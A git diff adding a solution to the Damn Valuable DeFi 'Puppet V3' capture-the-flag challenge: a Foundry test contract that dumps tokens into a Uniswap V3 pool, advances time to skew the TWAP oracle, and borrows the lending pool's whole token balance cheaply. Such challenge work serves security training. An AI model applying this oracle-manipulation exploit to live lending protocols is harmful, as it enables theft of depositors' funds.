@@ -5,11 +5,82 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
 import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 import {WETH} from "solmate/tokens/WETH.sol";
 import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+
+contract Executor is Test{
+    PuppetV3Pool lendingPool;
+    IUniswapV3Pool uniswapV3Pool;
+    ISwapRouter swapRouter;
+    DamnValuableToken token;
+    WETH weth;
+    address player;
+    address recovery;
+
+    constructor(
+        address _lendingPool,
+        address _player,
+        address _recovery
+    ) {
+        lendingPool = PuppetV3Pool(_lendingPool);
+        uniswapV3Pool = lendingPool.uniswapV3Pool();
+        token = lendingPool.token();
+        weth = lendingPool.weth();
+        player = _player;
+        recovery = _recovery;
+        swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    }
+
+    function execute() public payable {
+        // Pull all tokens from player
+        uint256 playerTokenBalance = token.balanceOf(player);
+        token.transferFrom(player, address(this), playerTokenBalance);
+
+        // deposit eth and receive weth
+        weth.deposit{value: msg.value}();
+
+        // Sell tokens for weth, lowering the price of the token
+        token.approve(address(swapRouter), playerTokenBalance);
+
+        swapRouter.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token),
+                tokenOut: address(weth),
+                fee: 3000,
+                recipient: address(this),
+                deadline: block.timestamp + 1,
+                amountIn: playerTokenBalance,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
+        // Move the block timestamp forward to lower the price of the token 
+        vm.warp(block.timestamp + 114);
+
+        uint256 poolTokenBalance = token.balanceOf(address(lendingPool));
+        uint256 depositAmountRequired = lendingPool.calculateDepositOfWETHRequired(poolTokenBalance);
+
+        console.log("Deposit amount required: %d", depositAmountRequired);
+        console.log("Current WETH balance: %d", weth.balanceOf(address(this)));
+
+        require(weth.balanceOf(address(this)) >= depositAmountRequired, "Not enough WETH to deposit");
+
+        // Pull all the tokens from the lending pool
+        weth.approve(address(lendingPool), depositAmountRequired);
+        lendingPool.borrow(poolTokenBalance);
+
+        // transfer all the tokens to the recovery address
+        token.transfer(recovery, poolTokenBalance);
+    }
+
+    receive() external payable {}
+}
+
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,7 +190,13 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        Executor executor = new Executor(
+            address(lendingPool),
+            player,
+            recovery
+        );
+        token.approve(address(executor), PLAYER_INITIAL_TOKEN_BALANCE);
+        executor.execute{value: PLAYER_INITIAL_ETH_BALANCE}();
     }
 
     /**
